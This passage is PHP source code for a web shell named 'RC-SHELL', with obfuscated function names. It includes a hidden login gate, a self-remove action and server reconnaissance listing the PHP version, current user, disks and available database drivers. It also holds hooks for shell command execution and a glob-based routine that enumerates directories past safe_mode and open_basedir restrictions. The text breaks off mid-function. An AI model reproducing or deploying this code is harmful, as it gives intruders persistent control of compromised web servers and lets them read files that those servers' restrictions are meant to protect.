function z5b(){ return z9d(z9c('&nbsp;')); } function z6s(){ return z10w(z5b()); } function z5z($a='',$c='',$s=''){ return '<div'.(($a!='')?' align="'.$a.'"':'').(($c!='')?' class="'.z4m($c,'3').'"':'').(($s!='')?z10r($s):'').'>'; } function z5h(){ return '</div>'; } function z5k($a='',$c='',$s=''){ return '<td'.(($a!='') ? ' align="'.$a.'"':'').(($c!='')?' class="'.z4m($c,'2').'"': '').(($s!='')?z10r($s):'').'>'."\n"; } function z7j($c='',$s=''){ return z5k('',$c,$s); } function z5l($c='',$s=''){ return z5k('left',$c,$s); } function z5m($c='',$s=''){ return z5k('right',$c,$s); } function z6q($c='',$s=''){ return z5k('center',$c,$s); } function z4c($a='',$n,$c='',$s=''){ return '<td colspan="'.$n.'"'.(($a!='') ? ' align="'.$a.'"':'').(($c!='')?' class="'.z4m($c,'2').'"': '').(($s!='')?z10r($s):'').'>'."\n"; } function z6i($n,$c='',$s=''){ return z4c('',$n,$c,$s); } function z4k($n,$c='',$s=''){ return z4c('left',$n,$c,$s); } function z4l($n,$c='',$s=''){ return z4c('right',$n,$c,$s); } function z4z($n,$c='',$s=''){ return z4c('center',$n,$c,$s); } function z7f(){ return '</td>'."\n"; } function z9c($i,$c='',$s=''){ return z7j($c,$s).$i.z7f(); } function z7k($i,$c='',$s=''){ return z5l($c,$s).$i.z7f(); } function z6z($i,$c='',$s=''){ return z5m($c,$s).$i.z7f(); } function z6l($i,$c='',$s=''){ return z6q($c,$s).$i.z7f(); } function z6x($i,$n,$c='',$s=''){ return z6i($n,$c,$s).$i.z7f(); } function z6y($i,$n,$c='',$s=''){ return z4k($n,$c,$s).$i.z7f(); } function z6e($i,$n,$c='',$s=''){ return z4l($n,$c,$s).$i.z7f(); } function z6r($i,$n,$c='',$s=''){ return z4z($n,$c,$s).$i.z7f(); } function z5w($n='',$c,$r=0,$w='',$h='') { return '<textarea'.($n!=''?' id="'.$n.'" name="'.$n.'"':'').' class="'.z4m($c,'6').'"'.(($w!=''||$h!='')?' style="'.($w!=''?'width:'.$w.'px;':'').($h!=''?'height:'.$h.'px;':'').'"':'').($r?' readonly':'').'>'; } function z5q() { return '</textarea>'; } function z9k($t='',$n=''){ return '<form method="POST" action=""'.(($t!='') ? ' target="_blank"' : '').(($n!='')? ' name="'.$n.'" id="'.$n.'"':'').'>'; } function z6b($c='',$t=''){ return '<form method="POST" action=""'.(($t!='') ? ' target="_blank"' : '').(($c!='')?' class="'.z4m($c,'3').'"': '').'>'; } function z7l(){ return '<form method="POST" action="" enctype="multipart/form-data">'; } function z7i($u,$t='',$m='GET'){ return '<form method="'.$m.'" action="'.$u.'"'.(($t!='') ? ' target="_blank"' : '').'>'; } function z9l(){ return '</form>'; } function z10r($i){ $u=array(); if(!@is_numeric($i)) return ''; $a=array('border-top:0;','border-bottom:0;','border-left:0;','border-right:0;','width: 50%;','width: 33%;', 'border-left: 1px solid #DDDDDD;','text-align: right !important;','width: 150px !important;','margin-left: 0 !important;'); $r=''; if(@strlen($i)>1){ for($n=0; $n<@strlen($i); $n++){ $c=$i[$n]; if(@isset($a[$c]) && !@isset($u[$c])){ $r .= $a[$c]; $u[$c]=''; } } } else { if(@isset($a[$i])) $r .= $a[$i]; } return ($r!='') ? ' style="'.$r.'"' : $r; } function z8z($i){ return (@is_bool($i) ? (($i) ? '1' : '0') : $i); } function z9z($n=1){ return @str_repeat("<br>",$n); } function z9x($n=1){ return @str_repeat("&nbsp;",$n); } function z6t($t,$c=''){ return '<span class="'.$c.'">'.$t.'</span>'; } function z4y($t){ return z6t($t,"nw"); } function z8k($t){ return z6t($t,"nr"); } function z5p($t){ return z6t($t,"rw"); } function z9j(){ return ' onfocus="this.select();" onmouseover="this.select();" onmouseout="this.select();"'; } function z4t($n,$v){ global ${$n}; return '<input type="radio" name="'.$n.'" value="'.$v.'"'.((@isset(${$n}) && ${$n}==$v) ? ' checked' : '').'>'; } function z9f($n,$v='1',$o='',$i=''){ global ${$n}; return '<input type="checkbox" id="'.$i.'" name="'.$n.'" value="'.$v.'" style="vertical-align: middle;"'.(($o=='') ? ((${$n}==$v) ? ' checked' : '') : (($o) ? ' checked': '')).'>'; } function z6w($f,$t){ return '<label for="'.$f.'">'.$t.'</label>'; } function z5u($i,$t,$n,$v='1',$o=''){ return z9f($n,$v,$o,$i).z6w($i,$t); } function z9g($n,$c='',$s=''){ return '<input type="file" name="'.$n.'" id="'.$n.'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').(($s!='') ? z10r($s):'').'>'; } function z8g($v,$c='',$o=''){ return '<input type="text" value="'.z8z($v).'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').(($o!='') ? z9j() : '').'>'; } function z6u($n,$v,$c='',$o='',$s=''){ return '<input type="text" name="'.$n.'" value="'.z8z($v).'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').($s!=''?' '.(@is_numeric($s)?z10r($s):$s):'').(($o!='') ? z9j() : '').'>'; } function z5y($n,$v,$c='',$o='',$s=''){ global ${$n}; return '<input type="text" name="'.$n.'" value="'.((@isset(${$n}) && !@empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] : z8z($v))).'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').($s!=''?' '.(@is_numeric($s)?z10r($s):$s):'').(($o!='') ? z9j() : '').'>'; } function z6p($n,$v,$c='',$o=''){ return '<input type="password" name="'.$n.'" value="'.z8z($v).'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').(($o!='') ? z9j() : '').'>'; } function z5e($n,$v,$c='',$o=''){ global ${$n}; return '<input type="password" name="'.$n.'" value="'.((@isset(${$n}) && !@empty(${$n})) ? ${$n} : z8z($v)).'"'.(($c!='')?' class="'.z4m($c,'4').'"':'').(($o!='') ? z9j() : '').'>'; } function z6o($n,$i,$c='',$s=''){ return '<input type="submit" '.($n!=''?' name="'.$n.'"':'').'value="'.z8z($i).'"'.(($c!='')?' class="'.z4m($c,'5').'"':'').(($s!='')?(@is_numeric($s)? z10r($s) : $s):'').'>'; } function z8b($i,$c='',$s=''){ return z6o('',$i,$c,$s); } function z1s($t,$i,$a,$c=''){ return '<input type="'.$t.'" value="'.$i.'" '.($t=='submit'?'onsubmit':'onclick').'="'.$a.'"'.(($c!='')?' class="'.z4m($c,'5').'"':'').'>'; } function z8v($i,$a,$c=''){ return z1s('submit', $i, $a, $c); } function z8m($i,$a,$c=''){ return z1s('button',$i, $a, $c); } function z8h($i,$a='',$c='',$e=''){ global $use_images; return ($use_images ? '<input type="image" src="?act=i&amp;img='.$i.(($e!='')? '&amp;exe=1':'').'" value="'.$a.'" alt="'.$a.'"'.(($c!='')?' class="'.z4m($c,'5').'"':'').'>' : z1x(($i=='small_dir'||$i=='small_home'?'d':'f'))); } function z2c($ip){ $ip=@preg_replace('/[\t\s\r\n]/','',$ip); if(!@is_numeric(@str_replace(".","",$ip))||@substr_count($ip,".")!=3){ return "failed"; }else{ $octets=@explode(".",$ip); $dec=($octets[0]*1<<24)+($octets[1]*1<<16)+($octets[2]*1<<8)+($octets[3]); return $dec; } } function z2z($ip){ $ip=@preg_replace('/[\t\s\r\n]/','',$ip); if(!@is_numeric(@str_replace(".","",$ip))||@substr_count($ip,".")!=3){ return "failed"; }else{ $dec=z2c($ip); $hex="0x".@dechex($dec); return $hex; } } function z1u($ip,$oct=""){ $ip=@preg_replace('/[\t\s\r\n]/','',$ip); if(!@is_numeric(@str_replace(".","",$ip))||@substr_count($ip,".")!=3){ return "failed"; }else{ $octets=@explode(".",$ip); for($i=0;$i<4;$i++){ $decoct=@decoct($octets[$i]); $len=@strlen($decoct); $leading=(9-$len); $oct.=@str_repeat("0",$leading).$decoct."."; } $oct=@substr($oct,0,@strlen($oct)-1); return $oct; } } function z9v($n,$v=NULL){ global ${$n}; return '<input type="hidden" name="'.$n.'" value="'.(($v==NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} :''): z8z($v)).'"'.'>'; } function z7m($n,$v=NULL){ global ${$n}; return '<input type="hidden" name="'.$n.'" value="'.(($v==NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] : '')) : z8z($v)).'"'.'>'; } function z5j(){ return (z7e('get_current_user') && @get_current_user()!='') ? @get_current_user() : 'Unknown'; } function z2a($a=array()){ $r=''; foreach($a as $k=>$v){ $r.=(@is_numeric($k) ? z9v($v) : z9v($k,$v)); } return $r; } function z8f($n,$v=NULL){ global ${$n}; return (($v==NULL) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} :''): z8z($v)); } function z2x($a=array()){ if(@isset($a['backf'])) return z2a($a); $r=''; foreach($a as $k=>$v){ $r.=(@is_numeric($k) ? $v.'='.@urlencode(z8f($v)) : $k.'='.@urlencode(z8f($k,$v))).'&'; } if($r!='') $r=z9v('merged',@base64_encode($r)); return $r; } function z8q($a,$t='',$u=0){ return ($u?z7l():z9k($t)).z2x($a); } function z5x($a,$i,$t=''){ return z8q($a,$t).$i.z9l(); } function z5n($a,$i){ return z8q($a,'',1).$i.z9l(); } function z7n($i){ return '<span style="font-size: 9px; color: #333333; font-weight: bold;">'.$i.'&nbsp; </span>'; } function z5t($i){ return z6z((!@empty($i)?z7n($i):$i),'15'); } function z5v($l,$i){ return z6l(z7n($l).$i,'1'); } function z10t($h,$n,$c='',$t=''){ return '<a href="'.$h.'"'.(($c!='') ? ' class="'.z4m($c,'5').'"':'').(($t!='')?' target="_blank"':'').'>'.$n.'</a>'; } function z6a($f){ global $nix, $sh_exec; $m=''; if(z7e('md5_file')&&@md5_file($f)!==false){ $m=@md5_file($f); } elseif($nix && $sh_exec){ $m=z9e('md5sum "'.$f.'"',0); if(@strstr($m,' ')) $m=@substr($m,0,@strpos($m,' ')); } return (@strlen($m)==32) ? $m : false; } function z3c(){ global $linux,$saddr, $dtotal,$dfree,$bsafe,$bopendir,$bmysql,$bmssql,$boracle,$bpostgres,$bcurl,$use_images; $a=@explode(" ",@getenv("SERVER_SOFTWARE")); $b=@explode("-",@phpversion()); if(@isset($a[0])) { $www=$a[0]; } else { $www="Unknown"; } $www .=z9x(1).z5x(array('act'=>'phpinfo','d'),z8b("PHP/".$b[0],'0')); echo z10w(z7u(z7k(z7i('http://whois.domaintools.com/'.$saddr,'1','POST').z8b(z9y("4"),'0').z9l().z9x(5).z7i('http://www.domaintools.com/research/traceroute/?query='.$saddr,'1','POST').z8b(z9y("5"),"0").z9l(),'6','5').z6z(z5x(array('act'=>'selfremove','d'),z8b(z9y("6"),'0')).z9x(5).z5x(array('act'=>'logout','d'),z8b(z9y("7"),'0')),'6','5')),'6'); echo z10w( z7u(z6l(z9y("8"),'2','2').(($linux)?z6l(z9y("9"),'2'):'').z6l(z9y("1"),'2').z6l(z9y("10"),'2').z6l(z9y("11"),'2').z6l(z9y("12"),'2').z6l(z9y("13"),'2').z6l(z9y("14"),'2').z6l(z9y("15"),'2').z6l(z9y("16"),'2').z6l(z9y("17"),'2').z6l(z9y("18"),'2')). z7u(z6l(z9p(),'3','2').(($linux)?z6l(@php_uname('r'),'3'):'').z6l(z5j(),'3').z6l($dtotal.' / '.$dfree,'3').z6l($www,'3').z6l(($bsafe?z6t(z9y("19"),'nr'):z6t(z9y("20"),'rw')),'3').z6l(($bopendir?z6t(z9y("21"),'nr'):z6t(z9y("424"),'rw')),'3').z6l(($bcurl?z6t(z9y("21"),'rw'):z9y("22")),'3').z6l(($bmysql?z6t(z9y("21"),'rw'):z9y("22")),'3').z6l(($bmssql?z6t(z9y("21"),'rw'):z9y("22")),'3').z6l(($boracle?z6t(z9y("21"),'rw'):z9y("22")),'3').z6l(($bpostgres?z6t(z9y("21"),'rw'):z9y("22")),'3')) ,'3'); } function z3z($login=0){ global $act,$use_images,$sh_exec,$safe_exec,$ft,$nogradient; echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html">
'.($use_images?'<link rel="shortcut icon" href="?act=i&amp;img=exe">':'').'
'.((!$login)? '<title>[ RC-SHELL v'.z7z('0').(!@empty($_SERVER["SERVER_NAME"]) ? ' - '.$_SERVER["SERVER_NAME"]:'').(!@empty($_SERVER["SERVER_ADDR"]) ? ' - '.$_SERVER["SERVER_ADDR"]:'').' ]</title>' : '<title>'.z9y("0").'</title>').'
<style type="text/css">
body, table, tr, td, div, select, input, textarea, pre, code { font: 100% '.z9q("fontfam").'; text-decoration: none; }
td, div { max-width: '.z7z('5',"width").'px; }
input, select, textarea { border: 0; padding: 0; }
input, select, textarea { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; -ms-box-sizing: border-box; }
input::-moz-focus-inner { border: 0;padding: 0; }
body { background-color: '.z9q("bodybg").'; font-family: '.z9q("fontfam").' !important; font-size: 10px !important; color: '.z9q("fontcolor").';}
*:focus {outline: none;}
.but1, .but2, .but3, .actbut, .but1:active, .but2:active, .but3:active .actbut:active { border: 1px solid #cccccc; margin-left: 1px; text-shadow: 1px 1px 2px #ffffff; vertical-align: middle; }
.but1, .but2, .but3, .actbut { '.z2y("#F5F5F5","#E0E0E0").' }
.but1:hover, .but2:hover, .but3:hover, .actbut:hover { '.z2y("#E0E0E0","#F5F5F5").' cursor: pointer; }
.but1 { width: 28px; height: 18px; font-size: 10px; font-weight: bold; }
.but2 { color: #4F4F4F; padding: 0 10px 0 10px; height: 20px; font-size: 10px; }
.actbut { color: #4F4F4F; padding: 0 10px 0 10px; height: 18px; font-size: 10px; font-weight: normal; }
'.(($login) ? '
.login { background: '.z9q("tablebg").'; border: 1px solid '.z9q("tableborder").'; -moz-box-shadow: '.z9q("tableshadow").' 0 0 8px; -webkit-box-shadow: 0 0 8px '.z9q("tableshadow").'; box-shadow: 0 0 8px '.z9q("tableshadow").'; margin-top: 150px; padding: 10px; text-align: left; }
.login td { padding: 0; }
.login input {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; height:20px; width:150px; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.lerror { color: '.z9q('errcolor').'; padding-bottom: 10px !important; }
' : '
.container { background: '.z9q("tablebg").'; width: '.z7z('5',"width").'px; border: 1px solid '.z9q("tableborder").'; -moz-box-shadow: '.z9q("tableshadow").' 0 0 8px; -webkit-box-shadow: 0 0 8px '.z9q("tableshadow").'; box-shadow: 0 0 8px '.z9q("tableshadow").'; }
form { display: inline; }
label { display: inline-block; vertical-align: baseline; }
a { text-decoration: none; }
.links, .links:active, .links:visited { background-color: transparent; color: '.z9q("tlinkcolor").'; text-shadow: 1px 1px 3px '.z9q("tlinkshadow").'; padding: 0; font-size: 10px; font-weight:normal; vertical-align: middle; vertical-align: inherit !important; }
.links:hover { color: '.z9q("tlinkcolorhover").'; cursor: pointer; }
.slinks { background-color: transparent; color: '.z9q('dircolor').'; font-size: 11px; font-weight: normal; }
.slinks:hover { cursor: pointer; }
.sinfo { width: 100%; }
.tdsinfo { '.z2y(z9q("tbarbg1"),z9q("tbarbg2")).' border-bottom: 1px solid '.z9q("tbarborderb").'; border-top: 1px solid '.z9q("tbarbordert").'; padding: 4px; }
.tdsinfo .links { font-size: 9px; }
.tdsinfo span { vertical-align: middle; }
.topcf { vertical-align: middle; }
.topt { '.z2y(z9q("topbg1"),z9q("topbg2")).' border-top: 1px solid '.z9q("topborder1").'; color: '.z9q("topcolor").'; text-shadow: 1px 1px 5px '.z9q("topshadow").'; padding-top: 10px; font-size: 9px; font-weight: bold; vertical-align: middle; }
.topc { background: '.((@isset($nogradient)&&$nogradient)?z9q("topbg1"):z9q("topbg2")).'; color: '.z9q("topcolor").'; padding-bottom: 10px; vertical-align: middle; }
.nav { '.z2y("#ffffff","#f3f3f3").' border-bottom: 1px solid #f0f0f0; padding: 2px 0 2px 2px; width: 100%; }
.footer { width: 100%; }
.tdfooter { '.z2y(z9q("footerbg1"),z9q("footerbg2")).' border-top: 1px solid '.z9q("footerborder1").'; padding: 3px; color: '.z9q("footercolor").'; text-shadow: 1px 1px 5px '.z9q("footershadow").'; font-size: 9px; font-weight: bold; vertical-align: middle; }
.headnfo { width: 100%; }
.ql { width: 100%; }
.tdql { background-color: transparent; border-top: 1px solid '.z9q("qlbg2").'; border-bottom: 3px solid #E0E0E0; }
.ql1, .ql2, .qlback { font-size: 10px; font-weight: bold; }
.ql1 { '.z2y("#fefefe","#E0E0E0",1).' border: 1px solid #EFEAEF; border-bottom: 0; color: #030303; width:100%; height: 22px; text-shadow: #cccccc 2px -1px 10px; }
.ql2 { '.z2y(z9q("qlbg1"), z9q("qlbg2"),1).' color: '.z9q("qlcolor").'; border-top: 1px solid '.z9q("qlborder").'; border-left: 0; border-right: 0; border-bottom: 1px solid #EFEAEF; width:100%; height: 22px; text-shadow: '.z9q("qlshadow").' 2px -1px 10px; }
.qlback { '.z2y(z9q("qlbg1"), z9q("qlbg2"),1).' border-top: 1px solid '.z9q("qlborder").'; border-bottom: 1px solid #EFEAEF; color: '.z9q("qlcolor").'; width:100%; text-shadow: '.z9q("qlshadow").' 2px -1px 10px; height: 22px; cursor: pointer; }
.ql1:hover { cursor:pointer; }
.ql2:hover, .qlback:hover { color: '.z9q("qlcolorhover").'; cursor: pointer; }
.size1, .size2, .size3, .size4, .size5, .size6, .size7, .size8, .size9, .size10 {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.size1, .size2, .size3, .size5, .size6, .size7, .size8, .size9, .size10  { height: 20px;}
.size1 { width: 300px; }
.size2 { width: 65px; }
.size3 { width: 200px; }
.size4 { width: 65px; height: 18px; }
.size5 { width: 100px; }
.size6 { width: 150px; }
.size7 { width: 40px; }
.size8 { width: 99%; min-width: 370px; }
.size9 { width: 205px; }
.size10 { width: 550px; }
.list1 { background: #F2f2f2; }
.list2 { background: #F5F5F5; }
.list3 { background: #E0E0E0; }
.list1:hover, .list2:hover { background-color: #E0E0E0; }
.list3:hover { background: #CCCCCC; }
.tdlsh1, .tdlsh2, .tdph { background-color: transparent; border-top: 1px solid #DDDDDD; border-right: 1px solid #FFFFFF; border-bottom: 1px solid #CCCCCC; border-left: 1px solid #CCCCCC; color: #333333; text-shadow: 1px 1px 3px #ffffff; height: 20px; }
.tdlsh1, .tdlsh2 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; }
.tdlsh1 { border-left: 0; min-width: 350px; }
.tdph { padding-left: 2px; }
.tdpl { background-color: transparent; border-left: 1px solid #dddddd; border-right: 1px solid #ffffff; padding: 2px; min-width: 40px; min-height: 20px; word-break: break-all; }
.head { background-color: transparent; border:0; min-width: 100%; color: #333333; text-shadow: 1px 1px 3px #ffffff; margin: 0; padding:0; font-size: 10px; font-weight: normal; text-align: left; }
.head:hover { cursor: pointer; }
.tdlsh1, .tdlsh2, .tdph { '.z2y("#F5F5F5", "#E0E0E0").' height: 22px !important; }
.tdlsh1:hover, .tdlsh2:hover, .tdph:hover { '.z2y("#fefefe","#dddddd").' }
.tdlsf { padding-left: 2px; min-width: 300px; height: 20px; vertical-align: middle; }
.tdlsfn, .tdlsf1 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; vertical-align: middle; }
.tdlsf1 { border-left: 1px solid #FFFFFF; min-width: 200px; }
.tdhead { '.z2y("#E0E0E0","#efefef",1).' border-top: 1px solid #f3f3f3; border-bottom: 1px solid #e0e0e0; border-right:0; color: #030303; padding-left: 3px; height: 20px; font-size: 9px; font-weight: bold; }
.tdhead td, .tdlbl { color: #333333; padding: 3px; font-weight: bold; text-shadow: 1px 1px 3px #ffffff; }
.tdlbl { width: 150px; }
.tdmail { padding: 0 10px 0 10px;}
img { vertical-align: middle; }
.fimg { border: 0; padding:0; padding-right:1px; vertical-align: middle; }
.tfilter { width: 100%; }
.tdfilter { '.z2y("#efefef","#E0E0E0").' border-top: 1px solid #fefefe; color: #333333; padding: 2px; font-weight: bold; }
.nr, .nw, .rw { background-color: transparent; font-weight:normal; text-tecoration: none; }
.nr { color: '.z9q('errcolor').'; }
.nw { color: '.z9q('normalcolor').'; }
.rw { color: '.z9q('okcolor').'; }
.dirlist, .filelist { background-color: transparent; border: 0;  padding: 0; min-width: 80%; font-size: 11px; text-decoration: none; text-align: left; vertical-align: middle !important; }
.dirlist { color: '.z9q('dircolor').'; }
.filelist { color: '.z9q('normalcolor').'; }
.dirlist:hover, .filelist:hover { cursor: pointer; }
pre { background-color: #FAFAFA; color:#333333; border: 1px solid #CCCCCC; margin-top:0; padding: 5px; max-width: 1000px; max-height: 350px; text-align: left; overflow-x: auto; white-space: pre-wrap; white-space: -moz-pre-wrap !important;  white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; }
pre code { display: block; }
.ftactive, .ftcompat, .ftother { '.z2y("#f3f3f3", "#cccccc").' border: 1px solid #BBBBBB; margin:2px 1px 2px 0; padding: 2px 8px 2px 8px; height:20px; font-size: 10px !important; }
.ftactive:hover, .ftcompat:hover, .ftother:hover { '.z2y("#CCCCCC", "#F3F3F3").' cursor: pointer; }
.ftactive { '.z2y("#CCCCCC", "#F3F3F3").' color: #000000; }
.ftcompat { color: '.z9q('okcolor').'; }
.ftother { color: '.z9q('normalcolor').'; }
.mbut1, .mbut2 { border: 1px solid #BBBBBB; margin: 2px 1px 2px 0; padding: 1px 5px 1px 5px; height: 20px; font-size: 10px; }
.mbut1 { '.z2y("#F3F3F3", "#CCCCCC").' }
.mbut2 { '.z2y("#CCCCCC", "#F3F3F3").' }
.mbut1:hover, .mbut2:hover { '.z2y("#cccccc", "#f3f3f3").' cursor: pointer; }
.iframe { background-color: #FFFFFF; border: 1px solid #CCCCCC; width: 99%;  height: 300px; vertical-align: middle; }
.console { background-color: transparent; color: #333333; border: 0; width: 100%; height: 300px; }
.tgeneric, .tedit, .txmail { border: 1px solid #cccccc; margin-top: 0; margin-bottom: 1px; width: 99%; }
.tgeneric { height: 150px; }
.tedit { height: 300px; text-align: left; }
.txmail { margin-top: 1px; width: 100%; height: 100px; }
.tsql1, .tsql2 { border: 1px solid #CCCCCC; margin-left: 1px; width: 205px; height: 60px; }
.tsql2 { width: 99% !important; }
.tinj { border: 1px solid #CCCCCC; margin: 1px; width: 300px; height: 46px; }
.tahex { width: 99%; margin-bottom:1px;}
.thex1, .thex2, .thex3 { border: 1px solid #CCCCCC; padding-top:1px; padding-left:3px; font: 13px "monospace", monospace; line-height: 20px; text-align: left; }
.thex1 { color: #000000; }
.thex2 { background-color: #FFFFFF; border-left: 0; border-right: 0; }
.thex3 { color: #000000;}
.idimg, .ifimg { '.z0u('3').' margin-right:2px; width: 16px; height: 16px; vertical-align: middle; }
.idimg { '.z2y(z9q('idirbg1'), z9q('idirbg2'),1).' border: 1px solid '.z9q('idirborder').';  }
.ifimg { '.z2y(z9q('ifilebg1'), z9q('ifilebg2')).' border: 1px solid '.z9q('ifileborder').'; }
.idimg:hover, .ifimg:hover { cursor: pointer; }
.selector, .divls { max-height:350px; height:350px !important; overflow: auto; }
.selector { border-top: 1px solid #FFFFFF; }
.scroll { background-color: transparent; border:0; margin:0; padding:0; max-width: 1024px; max-height:350px; overflow-y: auto; overflow-x: auto; text-align:left; }
.dwidth { width: 99%; }
.barbg { '.z2y("#dddddd","#ffffff").' border:1px solid #cccccc; margin-right: 5px; padding:0; width:100px; height:7px; vertical-align:middle; float:left; }
.barfil { '.z2y("#85FF00","#469F0B").'; height:7px; padding:0; }
').'
</style>
</head>
<body'.(($act=="cmd")?' onload="document.command.cmd.focus();"':'').'>'.(@in_array($act, array('ls','search','ftp'))? z3b():'').($act=="f"&&@isset($ft)&&$ft=="edit"?z1z():'').'
'.z7g(($login ? '1' : '0')).z6f().z7j(); } function z0g($c,$s,$t){ return '<input type="submit" title="'.$t.'" value="&nbsp;" style="border:1px solid '.z9q("topborder1").'; background: '.$c.';  width: '.$s.'px; height: '.$s.'px; vertical-align: middle; vertical-align: inherit !important; cursor: pointer;">'; } function z1x($type){ return '<input type="submit" class="'.($type=='d'?'idimg':'ifimg').'" value="&nbsp;">'; } function z0u($i){ return ' -moz-border-radius: '.$i.'px; -webkit-border-radius: '.$i.'px; border-radius: '.$i.'px;'; } function z2y($s,$e,$d=''){ global $nogradient; if(@isset($nogradient)&&$nogradient) return 'background: '.(($d=='')?$s:$e).';'; return 'background: '.(($d=='')?$s:$e).';
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=\''.$s.'\', endColorstr=\''.$e.'\');
background: -webkit-gradient(linear, left top, left bottom, from('.$s.'), to('.$e.'));
background: -moz-linear-gradient(top, '.$s.', '.$e.');
background: -o-linear-gradient(top, '.$s.', '.$e.');
'; } function z3j($login=0){ $tc=''; foreach(z7z(5,'skins') as $s) $tc .= z5x(array('act','d','color_skin'=>$s), z4y(z0g(z9q("topbg1"),"11",@strtoupper($s)))." "); echo (!$login ? z7a(z7u(z9c('RC-SHELL v'.z7z('0').' : '."PAGE GENERATED IN ".(@round(z10e()-start,4))." SECONDS",'4').z6z($tc,'4')),'2'):'').z7f().z7y().z10q().'</body></html>'; exit(); } function z1a($n, $v='', $e = 0, $p = '', $d='', $s=false, $h=false){ $_COOKIE[$n] = $v; return @setcookie($n, $v, $e, $p, $d, $s, $h); } function z1l($n){ if(@isset($_COOKIE[$n])) unset($_COOKIE[$n]); return @setcookie($n, NULL, -1); } function z1h($n){ return (@isset($_COOKIE[$n]) ? $_COOKIE[$n] :''); } function z0j(){ foreach(array('bcopy','bcut') as $t){ global ${$t}; if(@count(${$t})>0){ $_SESSION[$t]=${$t}; $c=@serialize(${$t}); z1a($t, $c); } else { z0i($t); z1l($t); } } } function z1d(){ foreach(array('bcopy','bcut') as $t){ global ${$t}; if(@isset($_SESSION[$t])){ ${$t}=$_SESSION[$t]; } elseif(($c=z1h($t))!='') { ${$t}=@unserialize($c); } else { ${$t}=array(); } } } function z0d($a=1){ foreach(array('bcopy','bcut') as $t){ global ${$t}; if(@isset(${$t})&&$a) unset(${$t}); z0i($t); z1l($t); } } function z1o($f,$t){ global $bcopy, $bcut; z0d(0); $u=(($t=='bcopy') ? 'bcut': 'bcopy'); foreach(${$u} as $k=>$v){ if(${$u}[$k]==$f) unset(${$u}[$k]); } if(!@in_array($f, ${$t})){ ${$t}[]=$f; } else { foreach(${$t} as $k=>$v){ if(${$t}[$k]==$f) unset(${$t}[$k]); } } } function z4g(){ global $color_skin; $l=z7z('1'); $zu=z1h('zu'); $zp=z1h('zp'); if($l['use_auth'] && z7e('md5')){ $s=$e=0; if(@isset($_SESSION['ok'])||($zu==$l['md5_user'] && $zp==$l['md5_pass'])){ $s=1; } elseif(@isset($_POST['zu']) && @isset($_POST['zp'])) { if(@md5($_POST['zu'])==$l['md5_user'] && @md5($_POST['zp'])==$l['md5_pass']){ $_SESSION['ok']=1; z1a('zu', @md5($_POST['zu'])); z1a('zp', @md5($_POST['zp'])); $s=1; } else { $e=1; } } if(!$s){ $color_skin=z7z('5','default_skin'); z3z(1); echo z9k().z7a(z7u(z9c(z7n(z9y("1"))).z9c(z6u('zu',''))).z7u(z9c(z7n(z9y("2"))).z9c(z6p('zp',''))).z7u(z9c('').z9c(z8b(z9y("3"),"7")))).z9l(); z3j(1); exit(); } } } function z0i($n){ if(@isset($_SESSION[$n])) unset($_SESSION[$n]); } function z1t($n){ return (@isset($_SESSION[$n]) ? $_SESSION[$n] : false); } function z4w(){ z1l('zu'); z1l('zp'); z0i('ok'); if(@count($_SESSION)>0){ foreach($_SESSION as $k=>$v) z0i($k); } @session_destroy(); } function z7b($f){ if(!z1y($f)){ return '0'; } elseif(!z0n($f)) { return '1'; } else return '2'; } function z5g($f){ $c=array("red","white","green"); return $c[(z7b($f))]; } function z6g($f){ $c=array("nr","nw","rw"); return $c[(z7b($f))]; } function z7x($s){ if(!@is_numeric($s)) return '0 B'; $m=1024; $u=@explode(' ', 'B KB MB GB TB PB'); for($i=0; $s>$m; $i++){ $s /= $m; } return @round($s, 2).' '.$u[$i]; } function z7c($i,$c=1){ foreach(z6m() as $r){ if(@strstr(z9b($r),$i)) return z8w(@explode($i,z9b($r)),$c); };} function z0e($errno,$errstr,$errfile,$errline){ global $safeDirArr,$c,$i; preg_match("#SAFE\s+MODE\s+Restriction\s+in\s+effect(.*)not\s+allowed\s+to\s+access\s+(.*)\s+owned\s+by\s+uid(.*)#",$errstr,$o)||preg_match("#open_basedir\s+restriction(.*)File\s*\((.*)\)\s+is\s+not#",$errstr,$o); if($o){ $safeDirArr[$c]=$o[2]; $c++; } } function z3w($dir){ global $win,$safeDirArr; if(z7e('glob')){ $error_reporting=@ini_get('error_reporting'); @error_reporting(E_WARNING); @ini_set("display_errors",1); $root="/"; if($dir) $root=$dir; $c=0; $safeDirArr=array(); @set_error_handler("z0e"); $chars="_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; for($i=0;$i<@strlen($chars);$i++){ $path="{$root}".((@substr($root,-1)!="/")?"/":NULL)."{$chars[$i]}"; $prevD=$safeDirArr[@count($safeDirArr)-1]; @glob($path."*"); if($safeDirArr[@count($safeDirArr)-1]!=$prevD){ for($j=0;$j<@strlen($chars);$j++){ $path="{$root}".((@substr($root,-1)!="/")?"/":NULL)."{$chars[$i]}{$chars[$j]}"; $prevD2=$safeDirArr[@count($safeDirArr)-1]; @glob($path."*"); if($safeDirArr[@count($safeDirArr)-1]!=$prevD2){ for($p=0;$p<@strlen($chars);$p++){ 